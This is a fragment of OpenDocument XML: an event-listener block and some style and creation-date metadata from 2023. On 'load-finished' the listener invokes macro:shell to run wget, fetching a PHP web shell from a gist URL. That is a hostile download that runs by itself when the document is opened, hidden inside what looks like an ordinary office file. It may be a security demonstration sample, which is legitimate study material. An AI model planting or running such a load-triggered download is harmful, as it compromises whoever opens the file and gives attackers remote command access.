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load-finished" xlink:href="macro:shell(%22wget%20https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22)" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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70e" officeooo:paragraph-rsid="00028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2:44:23.311951497</meta:creation-date>
    <dc:date>2023-06-21T12:44:50.646362081</dc:date>
    <meta:editing-duration>PT27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